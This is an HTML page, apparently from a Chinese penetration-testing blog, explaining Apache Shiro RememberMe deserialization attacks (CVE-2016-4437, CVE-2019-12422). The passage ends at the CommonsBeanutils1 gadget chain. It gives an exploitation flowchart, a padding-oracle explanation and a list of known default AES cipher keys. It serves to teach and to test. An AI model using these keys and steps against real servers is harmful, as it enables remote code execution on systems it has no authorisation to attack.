@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="一、前言Apache Shiro 是 Java 生态中广泛使用的安全框架，其 “RememberMe” 功能通过 Cookie 持久化用户身份，却因设计缺陷成为反序列化攻击的重灾区。从 2016 年的 Shiro-550（CVE-2016-4437）到 2019 年的 Shiro-721（CVE-2019-12422），再到无依赖利用链、内存马注入和自动化检测的持续演进，Shiro 反序列化始终是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro RememberMe反序列化深度利用">
+<meta property="og:url" content="https://congliang.github.io/Deserialization-shiro-deep/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="一、前言Apache Shiro 是 Java 生态中广泛使用的安全框架，其 “RememberMe” 功能通过 Cookie 持久化用户身份，却因设计缺陷成为反序列化攻击的重灾区。从 2016 年的 Shiro-550（CVE-2016-4437）到 2019 年的 Shiro-721（CVE-2019-12422），再到无依赖利用链、内存马注入和自动化检测的持续演进，Shiro 反序列化始终是">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-05-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.866Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="框架安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Deserialization-shiro-deep/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Deserialization-shiro-deep/","path":"Deserialization-shiro-deep/","title":"Shiro RememberMe反序列化深度利用"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Shiro RememberMe反序列化深度利用 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">一、前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81RememberMe-%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-number">2.</span> <span class="nav-text">二、RememberMe 机制与攻击面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Cookie-%E7%94%9F%E6%88%90%E6%B5%81%E7%A8%8B"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 Cookie 生成流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81Shiro-550%EF%BC%9A%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AF%86%E9%92%A5"><span class="nav-number">3.</span> <span class="nav-text">三、Shiro-550：硬编码密钥</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E6%BC%8F%E6%B4%9E%E6%A0%B9%E6%BA%90"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 漏洞根源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="nav-number">3.2.</span> <span class="nav-text">3.2 利用流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81Shiro-721%EF%BC%9APadding-Oracle-%E6%94%BB%E5%87%BB"><span class="nav-number">4.</span> <span class="nav-text">四、Shiro-721：Padding Oracle 攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E5%8E%9F%E7%90%86"><span class="nav-number">4.1.</span> <span class="nav-text">4.1 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-Shiro-550-vs-Shiro-721-%E5%AF%B9%E6%AF%94"><span class="nav-number">4.2.</span> <span class="nav-text">4.2 Shiro-550 vs Shiro-721 对比</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E5%B8%B8%E8%A7%81%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2%E5%9C%BA%E6%99%AF"><span class="nav-number">5.</span> <span class="nav-text">五、常见密钥泄露场景</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E6%BA%90%E7%A0%81%E4%B8%8E%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2"><span class="nav-number">5.1.</span> <span class="nav-text">5.1 源码与配置泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E5%B7%B2%E7%9F%A5%E5%AF%86%E9%92%A5%E9%9B%86%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%8C%E4%BB%85%E7%94%A8%E4%BA%8E%E6%8E%88%E6%9D%83%E7%A0%94%E7%A9%B6%EF%BC%89"><span class="nav-number">5.2.</span> <span class="nav-text">5.2 已知密钥集（部分，仅用于授权研究）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E6%97%A0%E4%BE%9D%E8%B5%96%E5%88%A9%E7%94%A8%EF%BC%9ACommonsBeanutils1-%E9%93%BE"><span class="nav-number">6.</span> <span class="nav-text">六、无依赖利用：CommonsBeanutils1 链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E2%80%9D%E6%97%A0%E4%BE%9D%E8%B5%96%E2%80%9D"><span class="nav-number">6.1.</span> <span class="nav-text">6.1 为什么需要”无依赖”</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-%E6%A0%B8%E5%BF%83-Gadget-%E9%93%BE%E8%B7%AF"><span class="nav-number">6.2.</span> <span class="nav-text">6.2 核心 Gadget 链路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81"><span class="nav-number">6.3.</span> <span class="nav-text">6.3 关键代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-4-%E9%93%BE%E9%80%89%E6%8B%A9%E7%AD%96%E7%95%A5"><span class="nav-number">6.4.</span> <span class="nav-text">6.4 链选择策略</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="nav-number">7.</span> <span class="nav-text">七、内存马注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-%E5%8A%A8%E6%9C%BA"><span class="nav-number">7.1.</span> <span class="nav-text">7.1 动机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-Filter-%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">7.2.</span> <span class="nav-text">7.2 Filter 型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-3-%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-number">7.3.</span> <span class="nav-text">7.3 持久化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%B7%A5%E5%85%B7%E9%93%BE"><span class="nav-number">8.</span> <span class="nav-text">八、检测与工具链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#8-1-%E8%A2%AB%E5%8A%A8%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="nav-number">8.1.</span> <span class="nav-text">8.1 被动指纹识别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-%E4%B8%BB%E5%8A%A8%E6%8E%A2%E6%B5%8B"><span class="nav-number">8.2.</span> <span class="nav-text">8.2 主动探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-3-%E5%B7%A5%E5%85%B7%E7%94%9F%E6%80%81"><span class="nav-number">8.3.</span> <span class="nav-text">8.3 工具生态</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-4-Key-%E7%88%86%E7%A0%B4%E6%B5%81%E7%A8%8B"><span class="nav-number">8.4.</span> <span class="nav-text">8.4 Key 爆破流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">9.</span> <span class="nav-text">九、防御建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E3%80%81%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">10.</span> <span class="nav-text">十、免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-number">11.</span> <span class="nav-text">十一、总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Deserialization-shiro-deep/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Shiro RememberMe反序列化深度利用 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Shiro RememberMe反序列化深度利用
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-05-15 08:00:00" itemprop="dateCreated datePublished" datetime="2026-05-15T08:00:00+08:00">2026-05-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>Apache Shiro 是 Java 生态中广泛使用的安全框架，其 “RememberMe” 功能通过 Cookie 持久化用户身份，却因设计缺陷成为反序列化攻击的重灾区。从 2016 年的 Shiro-550（CVE-2016-4437）到 2019 年的 Shiro-721（CVE-2019-12422），再到无依赖利用链、内存马注入和自动化检测的持续演进，Shiro 反序列化始终是渗透测试中的高频突破口。本文将系统梳理其底层原理、利用手法与检测工具链。</p>
+<h2 id="二、RememberMe-机制与攻击面"><a href="#二、RememberMe-机制与攻击面" class="headerlink" title="二、RememberMe 机制与攻击面"></a>二、RememberMe 机制与攻击面</h2><h3 id="2-1-Cookie-生成流程"><a href="#2-1-Cookie-生成流程" class="headerlink" title="2.1 Cookie 生成流程"></a>2.1 Cookie 生成流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──────────┐    登录请求     ┌──────────┐</span><br><span class="line">│  Browser │ ──────────────&gt; │  Server  │</span><br><span class="line">│          │ &lt;────────────── │          │</span><br><span class="line">│          │  Set-Cookie:    │          │</span><br><span class="line">│          │  rememberMe=    │          │</span><br><span class="line">│          │  base64(AES(    │          │</span><br><span class="line">│          │   serialize(    │          │</span><br><span class="line">│          │   Principal)))  │          │</span><br><span class="line">└──────────┘                 └──────────┘</span><br><span class="line">      │</span><br><span class="line">      │  后续请求携带 Cookie</span><br><span class="line">      │ ──────────────────────────&gt;  base64解码 → AES解密 → readObject()</span><br></pre></td></tr></table></figure>
+
+<p>核心代码逻辑：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 序列化主体对象</span></span><br><span class="line"><span class="type">byte</span>[] serialized = serialize(principalCollection);</span><br><span class="line"><span class="comment">// 2. AES-CBC 加密</span></span><br><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">cipher.init(Cipher.ENCRYPT_MODE, secretKey, iv);</span><br><span class="line"><span class="type">byte</span>[] encrypted = cipher.doFinal(serialized);</span><br><span class="line"><span class="comment">// 3. Base64 编码写入 Cookie</span></span><br><span class="line"><span class="type">String</span> <span class="variable">cookieValue</span> <span class="operator">=</span> Base64.encodeToString(encrypted);</span><br></pre></td></tr></table></figure>
+
+<p>服务端在 <code>CookieRememberMeManager.getRememberedPrincipals()</code> 中无条件逆向执行上述步骤，最终调用 <code>ObjectInputStream.readObject()</code>。<strong>攻击面在于：Cookie 完全由客户端提交，反序列化入口对攻击者可控。</strong></p>
+<h2 id="三、Shiro-550：硬编码密钥"><a href="#三、Shiro-550：硬编码密钥" class="headerlink" title="三、Shiro-550：硬编码密钥"></a>三、Shiro-550：硬编码密钥</h2><h3 id="3-1-漏洞根源"><a href="#3-1-漏洞根源" class="headerlink" title="3.1 漏洞根源"></a>3.1 漏洞根源</h3><p><code>AbstractRememberMeManager</code> 源码中写死了默认 AES 密钥：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY =</span><br><span class="line">    Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.setCipherKey(DEFAULT_CIPHER_KEY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>若开发者未调用 <code>setCipherKey()</code> 配置自定义密钥，全球所有该类应用共享同一把钥匙——攻击者构造的恶意 Cookie 通杀全量。</p>
+<h3 id="3-2-利用流程"><a href="#3-2-利用流程" class="headerlink" title="3.2 利用流程"></a>3.2 利用流程</h3><pre class="mermaid">flowchart TD
+    A[发现 Shiro 应用] --> B{rememberMe Cookie?}
+    B -->|是| C[默认密钥尝试解密]
+    B -->|否| D[未登录发包<br/>观察 Set-Cookie]
+    D --> C
+    C --> E{解密成功?}
+    E -->|是| F[ysoserial 生成 Payload]
+    E -->|否| G[尝试泄露密钥库]
+    G --> F
+    F --> H[AES 加密 + Base64]
+    H --> I[替换 Cookie 发包]
+    I --> J{命令执行?}
+    J -->|是| K[利用成功]
+    J -->|否| L[调整 Gadget 链]
+    L --> F</pre>
+
+<h2 id="四、Shiro-721：Padding-Oracle-攻击"><a href="#四、Shiro-721：Padding-Oracle-攻击" class="headerlink" title="四、Shiro-721：Padding Oracle 攻击"></a>四、Shiro-721：Padding Oracle 攻击</h2><h3 id="4-1-原理"><a href="#4-1-原理" class="headerlink" title="4.1 原理"></a>4.1 原理</h3><p>AES-CBC 模式下解密过程为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ciphertext[i-1] XOR AES_Decrypt(Ciphertext[i]) =&gt; Plaintext[i]</span><br></pre></td></tr></table></figure>
+
+<p>若服务端解密后对 <code>PKCS5Padding</code> 校验失败抛出异常（<code>PaddingException</code>），攻击者可根据响应差异逐字节推测中间状态值，构造任意密文——<strong>即使完全不知道密钥</strong>。平均需要约 2000-4000 次请求。</p>
+<h3 id="4-2-Shiro-550-vs-Shiro-721-对比"><a href="#4-2-Shiro-550-vs-Shiro-721-对比" class="headerlink" title="4.2 Shiro-550 vs Shiro-721 对比"></a>4.2 Shiro-550 vs Shiro-721 对比</h3><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>Shiro-550</th>
+<th>Shiro-721</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CVE</td>
+<td>CVE-2016-4437</td>
+<td>CVE-2019-12422</td>
+</tr>
+<tr>
+<td>攻击方式</td>
+<td>已知密钥直接构造</td>
+<td>Padding Oracle 推测</td>
+</tr>
+<tr>
+<td>前提</td>
+<td>AES 密钥已知</td>
+<td>存在合法 Cookie 作 Oracle</td>
+</tr>
+<tr>
+<td>难度</td>
+<td>低（单次请求）</td>
+<td>中（数千次请求）</td>
+</tr>
+<tr>
+<td>影响版本</td>
+<td>&lt; 1.2.5（未改密钥）</td>
+<td>&lt; 1.4.2</td>
+</tr>
+<tr>
+<td>修复</td>
+<td>移除硬编码密钥</td>
+<td>升级 1.4.2+</td>
+</tr>
+</tbody></table>
+<p>交互差异图示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Shiro-550:  攻击者 ──[单次恶意请求]──&gt; 目标 ──&gt; 代码执行</span><br><span class="line">Shiro-721:  攻击者 ──[请求1:探测]──&gt; 目标 ──[请求2:探测]──&gt; ... ──[请求N:利用]──&gt; 目标</span><br><span class="line">                      平均需 256×16 ≈ 4096 次请求完成一个块的破解</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、常见密钥泄露场景"><a href="#五、常见密钥泄露场景" class="headerlink" title="五、常见密钥泄露场景"></a>五、常见密钥泄露场景</h2><h3 id="5-1-源码与配置泄露"><a href="#5-1-源码与配置泄露" class="headerlink" title="5.1 源码与配置泄露"></a>5.1 源码与配置泄露</h3><p>开发者常将密钥硬编码后提交至公开仓库：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shiro.ini</span></span><br><span class="line"><span class="attr">securityManager.rememberMeManager.cipherKey</span> = <span class="number">4</span>AvVhmFLUs0KTA3Kprsdag==</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># application.yml</span></span><br><span class="line"><span class="attr">shiro:</span></span><br><span class="line">  <span class="attr">rememberMe:</span></span><br><span class="line">    <span class="attr">cookie:</span></span><br><span class="line">      <span class="attr">cipherKey:</span> <span class="string">wGiHplamyXlVB11UXWol8g==</span></span><br></pre></td></tr></table></figure>
+
+<p>Spring Boot Actuator 暴露的 <code>/env</code>、<code>/configprops</code> 端点也可能泄漏运行时配置中的密钥。</p>
+<h3 id="5-2-已知密钥集（部分，仅用于授权研究）"><a href="#5-2-已知密钥集（部分，仅用于授权研究）" class="headerlink" title="5.2 已知密钥集（部分，仅用于授权研究）"></a>5.2 已知密钥集（部分，仅用于授权研究）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==  # Shiro 默认密钥</span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag==  # 二开项目常见</span><br><span class="line">3AvVhdflUs0FTA3FKprsda==  # 某开源项目默认配置</span><br><span class="line">4AvVhmFLUs0KTA3Kprsdag==  # 教程示例代码</span><br><span class="line">5aaC5qKm5oqA5pyvAAAAAA==  # 入门 demo</span><br><span class="line">Z3VucwAAAAAAAAAAAAAAAA==  # 安全测试工具内置</span><br><span class="line">U3ByaW5nQmxhZGUAAAAAAA==  # Spring Boot 集成样例</span><br><span class="line">wGiHplamyXlVB11UXWol8g==  # 官方文档示例（已废弃）</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、无依赖利用：CommonsBeanutils1-链"><a href="#六、无依赖利用：CommonsBeanutils1-链" class="headerlink" title="六、无依赖利用：CommonsBeanutils1 链"></a>六、无依赖利用：CommonsBeanutils1 链</h2><h3 id="6-1-为什么需要”无依赖”"><a href="#6-1-为什么需要”无依赖”" class="headerlink" title="6.1 为什么需要”无依赖”"></a>6.1 为什么需要”无依赖”</h3><p>ysoserial 的 CommonsCollections 链依赖 CC 3.x&#x2F;4.x，但现代应用常不引入该库。CommonsBeanutils 几乎随 Apache Commons 生态”默认在场”（Struts2、Spring 等框架间接依赖），是替代首选。</p>
+<h3 id="6-2-核心-Gadget-链路"><a href="#6-2-核心-Gadget-链路" class="headerlink" title="6.2 核心 Gadget 链路"></a>6.2 核心 Gadget 链路</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  └── PriorityQueue.readObject()</span><br><span class="line">        └── PriorityQueue.heapify()</span><br><span class="line">              └── PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                    └── BeanComparator.compare()</span><br><span class="line">                          └── PropertyUtils.getProperty()</span><br><span class="line">                                └── TemplatesImpl.getOutputProperties()</span><br><span class="line">                                      └── TemplatesImpl.newTransformer()</span><br><span class="line">                                            └── （加载字节码执行任意代码）</span><br></pre></td></tr></table></figure>
+
